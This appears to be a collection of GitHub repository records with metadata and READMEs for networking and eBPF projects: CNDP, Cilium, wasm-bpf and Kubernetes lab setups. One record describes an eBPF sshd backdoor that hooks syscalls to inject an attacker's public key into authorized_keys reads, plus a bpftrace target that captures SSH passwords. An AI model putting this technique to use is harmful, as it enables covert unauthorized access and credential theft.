[![License](https://img.shields.io/badge/license-BSD3-blue.svg?style=flat)](https://opensource.org/licenses/BSD-3-Clause)

## Overview

Cloud Native Data Plane (CNDP) is a collection of userspace libraries for
accelerating packet processing for cloud applications. It aims to provide better
performance than that of standard network socket interfaces by taking advantage
of platform technologies such as Intel(R) AVX-512, Intel(R) DSA, CLDEMOTE, etc.
The I/O layer is primarily built on AF_XDP, an interface that delivers packets
straight to userspace, bypassing the kernel networking stack. CNDP provides ways
to expose metrics and telemetry with examples to deploy network services on
Kubernetes.

## CNDP Consumers

- **Cloud Network Function (CNF) and Cloud Application developers**: Those who
  create applications based on CNDP. CNDP hides the low-level I/O, allowing the
  developer to focus on their application.

- **CNF and Cloud Application consumers**: Those who consume the applications
  developed by the CNF developer. CNDP showcases deployment models for their
  applications using Kubernetes.

## CNDP Characteristics

CNDP follows a set of principles:

- **Functionality**: Provide a framework for cloud native developers that offers
  full control of their application.

- **Usability**: Simplify cloud native application development to enable the
  developer to create applications by providing APIs that abstract the
  complexities of the underlying system while still taking advantage of
  acceleration features when available.

- **Interoperability**: The CNDP framework is built primarily on top of AF_XDP.
  Other interfaces, such as memif, are also supported, however building on
  AF_XDP ensures it is possible to move an application across environments
  wherever AF_XDP is supported.

- **Portability/stability**: CNDP provides ABI stability and a common API to
  access network interfaces.

- **Performance**: Take advantage of platform technologies to accelerate packet
  processing or fall-back to software when acceleration is unavailable.

- **Observability**: Provide observability into the performance and operation of
  the application.

- **Security**: Security for deployment in a cloud environment is critical.

## CNDP background

CNDP was created to enable cloud native developers to use AF_XDP and other
interfaces in a simple way while providing better performance as compared to
standard Linux networking interfaces.

CNDP does not replace DPDK (Data Plane Development Kit), which provides the
highest performance for packet processing. DPDK implements user space drivers,
bypassing the kernel drivers. This approach of rewriting drivers is one reason
DPDK achieves the highest performance for packet processing. DPDK also
implements a framework to initialize and setup platform resources i.e. scanning
PCI bus for devices, allocating memory via hugepages, setting up
Primary/Secondary process support, etc.

In contrast to DPDK, CNDP does not have custom drivers. Instead it expects the
kernel drivers to implement AF_XDP, preferably in zero-copy mode. Since there
are no PCIe drivers, there's no PCI bus scanning, and does not require
physically contiguous and pinned memory. This simplifies deployment for cloud
native applications while gaining the performance benefits provided by AF_XDP.

## Development

In order to make contributions to CNDP, you need to have the following installed:

- [Pre-commit](https://pre-commit.com/#install)

You can install pre-commit by running the following command:

```bash
pip install pre-commit
```

After installing pre-commit, you need to install the pre-commit hooks by
running the following command:

```bash
pre-commit install
```

To run pre-commit manually

```bash
pre-commit run --all-files
```

### Development Container (Dev Container)

This project includes a **Dev Container** specification that provides a
consistent, isolated development environment. With this setup, you can
develop and build CNDP as well as run its tutorials seamlessly.

#### Key Benefits

- **Consistency**: All developers can work with the same development
  environment, ensuring uniform behavior across different systems.
- **Isolation**: The container prevents potential conflicts with software
  installed on your local machine.
- **Portability**: Easily share the development environment with team members,
  minimizing onboarding time and setup issues.

#### How to Use the Dev Container

1. **Visual Studio Code (Locally)**:
   - Open the project in VS Code and use the *Dev Containers* extension to
     launch the environment.
   - Simply choose **â€œReopen in Containerâ€**, and VS Code will build and
     attach the container for you.

2. **GitHub Codespaces**:
  If you prefer working in the cloud, the Dev Container is compatible with
  [GitHub Codespaces](https://docs.github.com/en/codespaces/overview), allowing
  you to develop directly in your browser with minimal local setup.

#### More Information

For further details, refer to the [GSG](./.devcontainer/gsg/devcontainer.md) or
the [introduction to Dev Containers](https://docs.github.com/en/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/introduction-to-dev-containers)
provided by GitHub.

## CNDP notable directories

The following shows a subset of the directory structure.

```bash
.
â”œâ”€â”€ ansible          # Ansible playbook to install in a system(s)
â”œâ”€â”€ containerization # Container configuration and setup scripts for Docker/K8s
â”œâ”€â”€ doc              # Documentation APIs, guides, getting started, ...
â”œâ”€â”€ examples         # Example applications to understand how to use CNDP features
â”œâ”€â”€ lang             # Language bindings and examples
â”‚Â Â  â”œâ”€â”€ go           # Go Language bindings to CNDP and tools (WIP)
â”‚Â Â  â””â”€â”€ rs           # Rust Language bindings for CNDP/Wireguard (WIP)
â”œâ”€â”€ lib              # Set of libraries for building CNDP applications
â”‚Â Â  â”œâ”€â”€ cnet         # Userspace network stack
â”‚Â Â  â”œâ”€â”€ common       # Libraries used by core and applications libraries
â”‚Â Â  â”œâ”€â”€ core         # Core libraries for CNDP
â”‚Â Â  â”œâ”€â”€ include      # Common headers for CNDP and applications
â”‚Â Â  â””â”€â”€ usr          # User set of libraries that are optional for developer
â”œâ”€â”€ test             # Unit test framework
â”‚Â Â  â”œâ”€â”€ common       # Common test code
â”‚Â Â  â”œâ”€â”€ fuzz         # Fuzzing (WIP)
â”‚Â Â  â””â”€â”€ testcne      # Functional unit testing application
â”œâ”€â”€ tools            # Tools for building CNDP
â”‚Â Â  â””â”€â”€ vscode       # Configuration files for vscode
â””â”€â”€ usrtools         # Tools for users
Â Â  â”œâ”€â”€ cnectl        # Remote CLI for CNDP applications
Â Â  â””â”€â”€ txgen         # Traffic Generator using AF_XDP and CNDP
```
"
nickolaev/vagrant-parallels-m1-k8s-cilium,4,1,4,0,Shell,Vagrant with Kubernetes on Parallels for M1/M2,2022-11-05T23:53:29Z,2023-12-21T08:49:48Z,1,"
# Vagrantfile and Scripts to Automate Kubernetes with Cilium setup using Kubeadm

The purpose of this repo is to create a demo/verification environment for Kubernetes with Cilium on Apple Silicon Macs with Darwin OS. It leverages Vagrant and Parallels as a virtual machine host provider.

This repo is based on the work found in:
 * https://github.com/ahmadjubair33/vagrant-kubernetes
 * https://computingforgeeks.com/install-kubernetes-cluster-ubuntu-jammy/
 * https://app.vagrantup.com/jharoian3/boxes/ubuntu-22.04-arm64


## Preparation

Install Parallels, Vagrant and the Parallels provider plugin:

```
% brew install --cask vagrant
...
% vagrant plugin install vagrant-parallels
...
% vagrant plugin list
vagrant-parallels (2.2.5, global)
  - Version Constraint: > 0
```

## The architecture of the solution

The infrastructure that is being deployed consists of:

 * one control-plane node; untainted so it can be use also as a worker
 * two dedicated worker nodes
 * no-kube-proxy Cillium installation

## Run it

To invoke the creation of the said infraastructure do

```
% vagrant up
...

```

After the successful completion the cluster is accessible as follows:
```
% export KUBECONFIG=$PWD/config/config
% kubectl get nodes
```

Install the cilium tools with brew, verify it is operational and connect to the Hubble UI in your browser.
```
% brew install cilium-cli
% cilium status
    /Â¯Â¯\
 /Â¯Â¯\__/Â¯Â¯\    Cilium:         OK
 \__/Â¯Â¯\__/    Operator:       OK
 /Â¯Â¯\__/Â¯Â¯\    Hubble:         OK
 \__/Â¯Â¯\__/    ClusterMesh:    disabled
    \__/

DaemonSet         cilium             Desired: 3, Ready: 3/3, Available: 3/3
Deployment        hubble-relay       Desired: 1, Ready: 1/1, Available: 1/1
Deployment        hubble-ui          Desired: 1, Ready: 1/1, Available: 1/1
Deployment        cilium-operator    Desired: 2, Ready: 2/2, Available: 2/2
Containers:       hubble-ui          Running: 1
                  cilium-operator    Running: 2
                  cilium             Running: 3
                  hubble-relay       Running: 1
Cluster Pods:     4/4 managed by Cilium
Image versions    cilium             quay.io/cilium/cilium:v1.12.3@sha256:30de50c4dc0a1e1077e9e7917a54d5cab253058b3f779822aec00f5c817ca826: 3
                  hubble-relay       quay.io/cilium/hubble-relay:v1.12.3@sha256:320dff9389e3fc6e2d33863510d497e8bcf245a5755236ae466a0729cc656a79: 1
                  hubble-ui          quay.io/cilium/hubble-ui:v0.9.2@sha256:d3596efc94a41c6b772b9afe6fe47c17417658956e04c3e2a28d293f2670663e: 1
                  hubble-ui          quay.io/cilium/hubble-ui-backend:v0.9.2@sha256:a3ac4d5b87889c9f7cc6323e86d3126b0d382933bd64f44382a92778b0cde5d7: 1
                  cilium-operator    quay.io/cilium/operator-generic:v1.12.3@sha256:816ec1da586139b595eeb31932c61a7c13b07fb4a0255341c0e0f18608e84eff: 2
% cilium hubble ui
â„¹ï¸  Opening ""http://localhost:12000"" in your browser...
```

In another console run the connectivity test and switch to the Hublle UI. Monitor the `cilium-test` namespace for the tests execution.
```
% export KUBECONFIG=$PWD/config/config
% cilium connectivity test
```
"
Esonhugh/sshd_backdoor,339,37,339,1,C,/root/.ssh/authorized_keys evil file watchdog with ebpf tracepoint hook.,2023-01-11T09:42:53Z,2025-10-08T16:02:44Z,41,"## sshd_backdoor

This Project is based on BlackHat USA 2021 and Defcon 29.

About Using ebpf technique, hijacking the process during sshd service getting the ~/.ssh/authorized_keys to authorize user logging and injecting our public key make our login successful.

### Demo

[![SSHD backdoor Demo](https://res.cloudinary.com/marcomontalbano/image/upload/v1674832434/video_to_markdown/images/youtube--2BUbPzwaGdk-c05b58ac6eb4c4700831b2b3070cd403.jpg)](https://youtu.be/2BUbPzwaGdk ""SSHD backdoor Demo"")

### Main Process in ebpf program

1. Hook OpenAt syscall enter: 
    check if the sshd process call this, log the pid of sshd.

2. Hook OpenAt Syscall exit:
    check the pid logged. logging the fd of pid, map pid->fd.

3. Hook Read Syscall enter:
    check the pid logged. logging the user_space_char_buffer of pid.

4. Hook Read Syscall exit:
    check the pid logged. find the buffer and change the buffer into our Key. Then delete pid in map to avoid blocking administrators' keys be read.

### Usage

```
$ make help

|=======================================================================================================
|usage:
|       build:  build full sshd_backdoor cli tool. But full sshd_backdoor is just supoorted the demo only
|       generate: Generate the ebpf prog in kernel with clang.
|                         if you need you can set the CFLAGS to append
|       test_ebpf: if you editing the ebpf-c c files and header files
|                          to test the ebpf can be compiled and pass ebpf verifier when load
|       tool_unload: bpftool unload progs.
|       tool_load: bpftool load  progs.
|       bpftrace_keylogging: logging sshd keys.Also it can catch the passwords when logging
|
```

## By the way

### sshd keylogging

```
make bpftrace_keylogging
```

which logging all message in sshd process. Of Course the key log.

## troubleshooting

Common Issue: https://github.com/Esonhugh/sshd_backdoor/issues/6

## reference

https://github.com/pathtofile/bad-bpf/blob/main/src/sudoadd.bpf.c

https://www.youtube.com/watch?v=5zixNDolLrg

etc.
"
mdditt2000/kubernetes-1-26,3,0,3,0,Shell,Example showcasing integration with BIGIP using Container Ingress on Kubernetes 1.26,2023-01-05T22:34:36Z,2023-11-07T01:41:15Z,94,"# kubernetes-1-26
Example showcasing F5 BIGIP using Container Ingress Service on Kubernetes 1.26

## BIG-IP and CNI

* [Flannel](https://github.com/mdditt2000/kubernetes-1-26/tree/main/cni/flannel#readme)
* [Calico](https://github.com/mdditt2000/kubernetes-1-26/tree/main/cni/calico#readme)
* [Cilium](https://github.com/mdditt2000/kubernetes-1-26/tree/main/cni/cilium#readme)"
cilium/cilium,22606,3433,22606,1046,Go,"eBPF-based Networking, Security, and Observability",2015-12-16T12:33:31Z,2025-10-12T17:24:07Z,36542,".. raw:: html

   <picture>
      <source media=""(prefers-color-scheme: light)"" srcset=""https://cdn.jsdelivr.net/gh/cilium/cilium@main/Documentation/images/logo.png"" width=""350"" alt=""Cilium Logo"">
      <img src=""https://cdn.jsdelivr.net/gh/cilium/cilium@main/Documentation/images/logo-dark.png"" width=""350"" alt=""Cilium Logo"">
   </picture>

|cii| |go-report| |clomonitor| |artifacthub| |slack| |go-doc| |rtd| |apache| |bsd| |gpl| |fossa| |gateway-api| |codespaces|

Cilium is a networking, observability, and security solution with an eBPF-based
dataplane. It provides a simple flat Layer 3 network with the ability to span
multiple clusters in either a native routing or overlay mode. It is L7-protocol
aware and can enforce network policies on L3-L7 using an identity based security
model that is decoupled from network addressing.

Cilium implements distributed load balancing for traffic between pods and to
external services, and is able to fully replace kube-proxy, using efficient
hash tables in eBPF allowing for almost unlimited scale. It also supports
advanced functionality like integrated ingress and egress gateway, bandwidth
management and service mesh, and provides deep network and security visibility and monitoring.

A new Linux kernel technology called eBPF_ is at the foundation of Cilium. It
supports dynamic insertion of eBPF bytecode into the Linux kernel at various
integration points such as: network IO, application sockets, and tracepoints to
implement security, networking and visibility logic. eBPF is highly efficient
and flexible. To learn more about eBPF, visit `eBPF.io`_.

.. image:: Documentation/images/cilium-overview.png
   :alt: Overview of Cilium features for networking, observability, service mesh, and runtime security

.. raw:: html

   <a href=""https://cncf.io/"">
      <picture>
         <source media=""(prefers-color-scheme: light)"" srcset=""https://github.com/cncf/artwork/blob/main/other/cncf-member/graduated/color/cncf-graduated-color.svg"" />
         <img src=""https://github.com/cncf/artwork/blob/main/other/cncf-member/graduated/white/cncf-graduated-white.svg"" alt=""CNCF Graduated Project"" height=""80"" />
      </picture>
   </a>
   <a href=""https://ebpf.io/"">
      <picture>
         <source media=""(prefers-color-scheme: light)"" srcset="".github/assets/ebpf-horizontal.svg"" />
         <img src="".github/assets/ebpf-horizontal-dark-back.svg"" alt=""eBPF Logo"" height=""80"" align=""right"" />
      </picture>
   </a>

Stable Releases
===============

The Cilium community maintains minor stable releases for the last three minor
Cilium versions. Older Cilium stable versions from minor releases prior to that
are considered EOL.

For upgrades to new minor releases please consult the `Cilium Upgrade Guide`_.

Listed below are the actively maintained release branches along with their latest
patch release, corresponding image pull tags and their release notes:

+---------------------------------------------------------+------------+------------------------------------+----------------------------------------------------------------------------+
| `v1.18 <https://github.com/cilium/cilium/tree/v1.18>`__ | 2025-09-16 | ``quay.io/cilium/cilium:v1.18.2``  | `Release Notes <https://github.com/cilium/cilium/releases/tag/v1.18.2>`__  |
+---------------------------------------------------------+------------+------------------------------------+----------------------------------------------------------------------------+
| `v1.17 <https://github.com/cilium/cilium/tree/v1.17>`__ | 2025-09-22 | ``quay.io/cilium/cilium:v1.17.8``  | `Release Notes <https://github.com/cilium/cilium/releases/tag/v1.17.8>`__  |
+---------------------------------------------------------+------------+------------------------------------+----------------------------------------------------------------------------+
| `v1.16 <https://github.com/cilium/cilium/tree/v1.16>`__ | 2025-09-22 | ``quay.io/cilium/cilium:v1.16.15`` | `Release Notes <https://github.com/cilium/cilium/releases/tag/v1.16.15>`__ |
+---------------------------------------------------------+------------+------------------------------------+----------------------------------------------------------------------------+

Architectures
-------------

Cilium images are distributed for AMD64 and AArch64 architectures.

Software Bill of Materials
--------------------------

Starting with Cilium version 1.13.0, all images include a Software Bill of
Materials (SBOM). The SBOM is generated in `SPDX`_ format. More information
on this is available on `Cilium SBOM`_.

.. _`SPDX`: https://spdx.dev/
.. _`Cilium SBOM`: https://docs.cilium.io/en/latest/configuration/sbom/

Development
===========

For development and testing purpose, the Cilium community publishes snapshots,
early release candidates (RC) and CI container images build from the `main
branch <https://github.com/cilium/cilium/commits/main>`_. These images are
not for use in production.

For testing upgrades to new development releases please consult the latest
development build of the `Cilium Upgrade Guide`_.

Listed below are branches for testing along with their snapshots or RC releases,
corresponding image pull tags and their release notes where applicable:

+----------------------------------------------------------------------------+------------+-----------------------------------------+---------------------------------------------------------------------------------+
| `main <https://github.com/cilium/cilium/commits/main>`__                   | daily      | ``quay.io/cilium/cilium-ci:latest``     | N/A                                                                             |
+----------------------------------------------------------------------------+------------+-----------------------------------------+---------------------------------------------------------------------------------+
| `v1.19.0-pre.1 <https://github.com/cilium/cilium/commits/v1.19.0-pre.1>`__ | 2025-10-01 | ``quay.io/cilium/cilium:v1.19.0-pre.1`` | `Release Notes <https://github.com/cilium/cilium/releases/tag/v1.19.0-pre.1>`__ |
+----------------------------------------------------------------------------+------------+-----------------------------------------+---------------------------------------------------------------------------------+

Functionality Overview
======================

.. begin-functionality-overview

CNI (Container Network Interface)
---------------------------------

`Cilium as a CNI plugin <https://cilium.io/use-cases/cni/>`_ provides a
fast, scalable, and secure networking layer for Kubernetes clusters. Built
on eBPF, it offers several deployment options:

* **Overlay networking:** encapsulation-based virtual network spanning all
  hosts with support for VXLAN and Geneve. It works on almost any network
  infrastructure as the only requirement is IP connectivity between hosts
  which is typically already given.

* **Native routing mode:** Use of the regular routing table of the Linux
  host. The network is required to be capable of routing the IP addresses
  of the application containers. It integrates with cloud routers, routing
  daemons, and IPv6-native infrastructure.

* **Flexible routing options:** Cilium can automate route learning and
  advertisement in common topologies such as using L2 neighbor discovery
  when nodes share a layer 2 domain, or BGP when routing across layer 3
  boundaries.

Each mode is designed for maximum interoperability with existing
infrastructure while minimizing operational burden.

Load Balancing
--------------

Cilium implements distributed load balancing for traffic between application
containers and to/from external services. The load balancing is implemented
in eBPF using efficient hashtables enabling high service density and low
latency at scale.

* **East-west load balancing** rewrites service connections at the socket
  level (``connect()``), avoiding the overhead of per-packet NAT and fully
  `replacing kube-proxy <https://cilium.io/use-cases/kube-proxy/>`_.

* **North-south load balancing** supports XDP for high-throughput scenarios
  and `layer 4 load balancing <https://cilium.io/use-cases/load-balancer/>`_
  including Direct Server Return (DSR), and Maglev consistent hashing.

Cluster Mesh
------------

Cilium `Cluster Mesh <https://cilium.io/use-cases/cluster-mesh/>`_ enables
secure, seamless connectivity across multiple Kubernetes clusters. For
operators running hybrid or multi-cloud environments, Cluster Mesh ensures
a consistent security and connectivity experience.

* **Global service discovery**: Workloads across clusters can discover and
  connect to services as if they were local. This enables fault tolerance,
  like automatically failing over to backends in another cluster, and
  exposes shared services like logging, auth, or databases across
  environments.

* **Unified identity model:** Security policies are enforced based on
  identity, not IP address, across all clusters.

Network Policy
--------------

Cilium `Network Policy <https://cilium.io/use-cases/network-policy/>`_
provides identity-aware enforcement across L3-L7. Typical container
firewalls secure workloads by filtering on source IP addresses and
destination ports. This concept requires the firewalls on all servers to be
manipulated whenever a container is started anywhere in the cluster.

In order to avoid this situation which limits scale, Cilium assigns a
security identity to groups of application containers which share identical
security policies. The identity is then associated with all network packets
emitted by the application containers, allowing to validate the identity at
the receiving node.

* **Identity-based security** removes reliance on brittle IP addresses.

* **L3/L4 policies** restrict traffic based on labels, protocols, and ports.

* **DNS-based policies:** Allow or deny traffic to FQDNs or wildcard domains
   (e.g., ``api.example.com``, ``*.trusted.com``). This is especially useful
   for securing egress traffic to third-party services.

* **L7-aware policies** allow filtering by HTTP method, URL path, gRPC call,
  and more:

  * Example: Allow only GET requests to ``/public/.*``.

  * Enforce the presence of headers like ``X-Token: [0-9]+``.

CIDR-based egress and ingress policies are also supported for controlling
access to external IPs, ideal for integrating with legacy systems or
regulatory boundaries.

Service Mesh
------------

With Cilium `Service Mesh <https://cilium.io/use-cases/service-mesh/>`_,
operators gain the benefits of fine-grained traffic control, encryption, observability,
access control, without the cost and complexity of traditional proxy-based
designs. Key features include:

* **Mutual authentication** with automatic identity-based encryption between
  workloads using IPSec or WireGuard.

* **L7-aware policy enforcement** for security and compliance.

* **Deep integration with the Kubernetes Gateway API :** Acts as a
  `Gateway API <https://cilium.io/use-cases/gateway-api/>`_ compliant data
  plane, allowing you to declaratively manage ingress, traffic splitting, and
  routing behavior using Kubernetes-native CRDs.

Observability and Troubleshooting
---------------------------------

Observability is built into Cilium from the ground up, providing rich
visibility that helps operators diagnose and understand system behavior
including:

* **Hubble**: A fully integrated observability platform that offers
  real-time service maps, flow visibility with identity and label metadata,
  and DNS-aware filtering and protocol-specific insights

* **Metrics and alerting**: Integration with Prometheus, Grafana, and other
  monitoring systems.

* **Drop reasons and audit trails**: Get actionable insights into why traffic
  was dropped, including policy or port violations and issues like failed
  DNS lookups.

.. end-functionality-overview

Getting Started
===============

* `Why Cilium?`_
* `Getting Started`_
* `Architecture and Concepts`_
* `Installing Cilium`_
* `Frequently Asked Questions`_
* Contributing_

Community
=========

Slack
-----

Join the Cilium `Slack channel <https://slack.cilium.io>`_ to chat with
Cilium developers and other Cilium users. This is a good place to learn about
Cilium, ask questions, and share your experiences.

Special Interest Groups (SIG)
-----------------------------

See `Special Interest groups
<https://github.com/cilium/community/blob/main/sigs.yaml>`_ for a list of all SIGs and their meeting times.

Developer meetings
------------------
The Cilium developer community hangs out on Zoom to chat. Everybody is welcome.

* Weekly, Wednesday,
  5:00 pm `Europe/Zurich time <https://time.is/Canton_of_Zurich>`__ (CET/CEST),
  usually equivalent to 8:00 am PT, or 11:00 am ET. `Meeting Notes and Zoom Info`_
* Third Wednesday of each month, 9:00 am `Japan time <https://time.is/Tokyo>`__ (JST). `APAC Meeting Notes and Zoom Info`_

eBPF & Cilium Office Hours livestream
-------------------------------------
We host a weekly community `YouTube livestream called eCHO <https://www.youtube.com/channel/UCJFUxkVQTBJh3LD1wYBWvuQ>`_ which (very loosely!) stands for eBPF & Cilium Office Hours. Join us live, catch up with past episodes, or head over to the `eCHO repo <https://github.com/isovalent/eCHO>`_ and let us know your ideas for topics we should cover.

Governance
----------
The Cilium project is governed by a group of `Maintainers and Committers <https://raw.githubusercontent.com/cilium/cilium/main/MAINTAINERS.md>`__.
How they are selected and govern is outlined in our `governance document <https://github.com/cilium/community/blob/main/GOVERNANCE.md>`__.

Adopters
--------
A list of adopters of the Cilium project who are deploying it in production, and of their use cases,
can be found in file `USERS.md <https://github.com/cilium/cilium/blob/main/USERS.md>`__.

License
=======

.. _apache-license: LICENSE
.. _bsd-license: bpf/LICENSE.BSD-2-Clause
.. _gpl-license: bpf/LICENSE.GPL-2.0

The Cilium user space components are licensed under the
`Apache License, Version 2.0 <apache-license_>`__.
The BPF code templates are dual-licensed under the
`General Public License, Version 2.0 (only) <gpl-license_>`__
and the `2-Clause BSD License <bsd-license_>`__
(you can use the terms of either license, at your option).

.. _`Cilium Upgrade Guide`: https://docs.cilium.io/en/stable/operations/upgrade/
.. _`Why Cilium?`: https://docs.cilium.io/en/stable/overview/intro
.. _`Getting Started`: https://docs.cilium.io/en/stable/#getting-started
.. _`Architecture and Concepts`: https://docs.cilium.io/en/stable/overview/component-overview/
.. _`Installing Cilium`: https://docs.cilium.io/en/stable/gettingstarted/k8s-install-default/
.. _`Frequently Asked Questions`: https://github.com/cilium/cilium/issues?utf8=%E2%9C%93&q=is%3Aissue+label%3Akind%2Fquestion+
.. _Contributing: https://docs.cilium.io/en/stable/contributing/development/
.. _Prerequisites: https://docs.cilium.io/en/stable/operations/system"
eunomia-bpf/wasm-bpf,422,28,422,6,Rust,"WebAssembly library, toolchain and runtime for eBPF programs",2022-11-04T02:41:04Z,2025-10-06T17:11:49Z,221,"![logo](docs/logo.png)

# ðŸ“¦ Wasm-bpf: Wasm library and toolchain for eBPF

[![Test Rntime](https://github.com/eunomia-bpf/wasm-bpf/actions/workflows/rust.yml/badge.svg)](https://github.com/eunomia-bpf/wasm-bpf/actions/workflows/rust.yml)
[![codecov](https://codecov.io/gh/eunomia-bpf/wasm-bpf/branch/main/graph/badge.svg?token=6TKN4WU99U)](https://codecov.io/gh/eunomia-bpf/wasm-bpf)
[![CodeFactor](https://www.codefactor.io/repository/github/eunomia-bpf/wasm-bpf/badge)](https://www.codefactor.io/repository/github/eunomia-bpf/wasm-bpf)
[![DeepSource](https://deepsource.io/gh/eunomia-bpf/wasm-bpf.svg/?label=active+issues&show_trend=true&token=rcSI3J1-gpwLIgZWtKZC-N6C)](https://deepsource.io/gh/eunomia-bpf/wasm-bpf/?ref=repository-badge)
[![](https://img.shields.io/crates/v/wasm-bpf-rs.svg)](https://crates.io/crates/wasm-bpf-rs)

[ä¸­æ–‡æ–‡æ¡£](README_zh.md) [Gitee](https://gitee.com/eunomia-bpf/wasm-bpf) [Github](https://github.com/eunomia-bpf/wasm-bpf)

`Wasm-bpf` is a WebAssembly eBPF library, toolchain and runtime powered by [CO-RE](https://facebookmicrosites.github.io/bpf/blog/2020/02/19/bpf-portability-and-co-re.html)(Compile Once â€“ Run Everywhere) [libbpf](https://github.com/libbpf/libbpf). It can help you build almost every eBPF programs or usecases to `Wasm` with nearly zero modification, and run them cross platforms with Wasm sandbox.

# Quick start guides

âŒ¨ï¸ [Introduction](#introduction) to wasm-bpf, and also [Our talks in Kubecon](https://kccncna2023.sched.com/event/1R2uf) \
ðŸ“¦ [Features](#features) \
ðŸš€ [Running](#running-a-standalone-wasm-ebpf-program) a standalone Wasm program from CLI or Docker \
ðŸ”Œ Embed a Wasm-eBPF function in your [Rust program](#embed-a-wasm-ebpf-function-in-your-program) or [C/C++ program](#build-the-runtime)  \
ðŸ”¨ [Examples](#examples) covering the use cases from `tracing`, `networking` to `security` \
ðŸ“š [How it works](#how-it-works) \
ðŸ¤– [Build](#build-the-runtime) the runtime, or as [a plugin for WasmEdge](https://github.com/WasmEdge/WasmEdge/tree/master/plugins/wasm_bpf)

ðŸ“š **[Check out our more documentations](https://docs.eunomia.dev/)**

## âŒ¨ï¸ Introduction

`WebAssembly` (Wasm) is a portable binary format for executable code. The code is executed at a nearly-native speed in a memory-safe (for host) sandbox, with clearly defined resource constraints, and APIs for communicating with the embedding host environment (eg. proxy).The `wasm-bpf` project combines Wasm and eBPF technologies to enhance the performance and programmability of eBPF applications.

With `wasm-bpf`, users can dynamically load and securely execute user-defined or community-contributed Wasm-eBPF codes as `plug-ins` in their software products, such as observability platforms or service proxy. This enables efficient and scalable data collection, while also allowing for advanced processing and analysis of that data.

It also enables developers to write eBPF programs in familiar languages like `C/C++`, `Rust`, `Go`, and more than 30 other programming languages, and deploy them easily across different Linux distributions. Additionally, cloud providers can leverage wasm-bpf to offer a `secure` and `high-performance` environment for their customers to develop and deploy eBPF applications in their cloud environments.

## ðŸš€ Get started

### ðŸ“¦ Install wasm-bpf

Run the following command to install the `wasm-bpf` CLI tool:

```sh
cargo install wasm-bpf 
```

### Running a standalone Wasm-eBPF program

Running the `runqlat` example with docker:

```console
$ wget https://eunomia-bpf.github.io/wasm-bpf/examples/runqlat/runqlat.wasm
$ docker run --rm -it --privileged -v $(pwd):/examples ghcr.io/eunomia-bpf/wasm-bpf:latest /examples/runqlat.wasm
Tracing run queue latency... Hit Ctrl-C to end.

     usecs               : count    distribution
         0 -> 1          : 72       |*****************************           |
         2 -> 3          : 93       |*************************************   |
         4 -> 7          : 98       |****************************************|
         8 -> 15         : 96       |*************************************** |
        16 -> 31         : 38       |***************                         |
        32 -> 63         : 4        |*                                       |
        64 -> 127        : 5        |**                                      |
       128 -> 255        : 6        |**                                      |
       256 -> 511        : 0        |                                        |
       512 -> 1023       : 0        |                                        |
      1024 -> 2047       : 0        |                                        |
      2048 -> 4095       : 1        |                                        |
```

For more tools to distribute and deploy Wasm-eBPF programs for usecases from `Observability`, `Networking` to `Security`, please refer to [eunomia-bpf](https://github.com/eunomia-bpf/eunomia-bpf) repo.

### Embed a Wasm-eBPF function in your program

Add the following line to your Cargo.toml to use Wasm-bpf as a `library`:

```toml
wasm-bpf-rs = ""0.2.2""
```

See the [main.rs](runtime/cli/src/main.rs) for an example of how to use the `wasm-bpf-rs` library.

## Features

- **`General purpose`**: provide most abilities from eBPF to Wasm, `polling` from the ring buffer or perf buffer, bidirectional communications between `kernel` eBPF and `userspace` Wasm using `maps`, dynamically `loading`, `attaching` or `detaching`, etc. Supports a large number of eBPF program types and map types.
- **`High performance`**: No `serialization` overhead for complex data types, using `shared memory` to avoid copy overhead between host and Wasm.
- **`Easy to use`**: provide a similar developing experience as the [libbpf-bootstrap](https://github.com/libbpf/libbpf-bootstrap), `auto generate` the Wasm-eBPF skeleton headers and type definitions for bindings. Write your eBPF programs in `C/C++`, `Rust`, `Go` and compile to Wasm.
- **`Ultralightweight`**: the miminal runtime has only `1.5 MB` in binary size. Compiled Wasm module would be only `~90K`. With the same toolchain, you can easily build your own Wasm-eBPF runtime in any languages and platforms!

See the [examples](examples) directory for examples of eBPF programs written in C, Rust, Go and compiled to Wasm, covering the use cases from `tracing`, `networking` to `security`.

For tools to distribute Wasm-eBPF programs in [`OCI`](https://opencontainers.org/) images, please refer to [eunomia-bpf](https://github.com/eunomia-bpf/eunomia-bpf) repo.

## Examples

See the [examples](examples) directory for examples of eBPF programs written in C, Rust, Go and compiled to WASM.

`tracing examples`
- [bootstrap](examples/bootstrap) and [rust-bootstrap](examples/rust-bootstrap): trace process exec and exit
- [runqlat](examples/runqlat): summarizes scheduler run queue latency as a histogram
- [execve](examples/execve) and [go-execve](examples/go-execve): trace execve syscall

`security example`
- [lsm](examples/lsm) and  [go-lsm](examples/go-lsm): check the permission to remove a directory

`networking example`
- [sockfilter](examples/sockfilter): monitoring packet and dealing with `__sk_buff`.
- [sockops](examples/sockops): Add the pid int tcp option in syn packet.

## How it works

An eBPF application typically consists of two parts: the `user space part` and `the kernel space part`. With wasm-bpf, the user space part is executed in a WebAssembly (Wasm) sandbox while the kernel space part is executed in the eBPF runtime in the Linux kernel. This separation of concerns allows for greater flexibility and security in developing and running eBPF programs, as well as the ability to leverage the benefits of both Wasm and eBPF.

The wasm-bpf runtime require two parts: `the host side`(Outside the Wasm runtime) and the `Wasm guest side`(Inside the Wasm runtime).

- host side: A simple runtime implementation example
  - see [runtime/cpp](runtime/cpp), which would be a sample runtime in `C++` built on the top of [libbpf](https://github.com/libbpf/libbpf) and [WAMR](https://github.com/bytecodealliance/wasm-micro-runtime). Another more complex runtime implement in `Rust` is [runtime/wasm-bpf-rs](runtime/wasm-bpf-rs), based on [Wasmtime](https://github.com/bytecodealliance/wasmtime).
  - You can easily build your own Wasm-eBPF runtime in `any` languages, `any` eBPF libraries and `any` Wasm runtimes with the same System interface.
- wasm side: toolchains and libraries
  - a [`libbpf-wasm`](wasm-sdk/c/libbpf-wasm.h) header only library to provide libbpf APIs for Wasm guest `C/C++` code.
  - a [`bpftool`](https://github.com/eunomia-bpf/bpftool/tree/wasm-bpftool) tool to generate the Wasm-eBPF `skeleton` headers, and `C struct definitions` for passing data between the host and Wasm guest without serialization.
  - `Rust`, `Go` and other language support is similar to the `C/C++` support.

For details compile process, please refer to the [examples/bootstrap/README.md](examples/bootstrap/README.md).  The figure below shows the overall interaction between the eBPF and Wasm runtimes:

![wasi-bpf](docs/wasm-bpf-no-bcc.png)

A Wasm module could load and control multiple eBPF programs at the same time, and can call another Wasm module written in other languages to process the data or control with [the component model](https://github.com/WebAssembly/component-model).

